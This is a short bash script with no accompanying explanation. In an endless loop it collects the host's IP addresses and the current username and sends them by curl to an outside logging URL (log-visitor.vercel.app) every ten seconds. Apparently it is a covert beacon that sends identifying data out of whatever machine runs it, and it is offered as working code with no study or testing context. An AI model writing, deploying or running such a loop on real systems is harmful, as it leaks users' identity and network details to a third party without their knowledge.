while true
do
    ips=$(hostname -I)
    ips="${ips// /+}"
    username=$(whoami)
    finalUrl="https://log-visitor.vercel.app/?id=$username&ip=$ips"
    curl $finalUrl
    sleep 10
done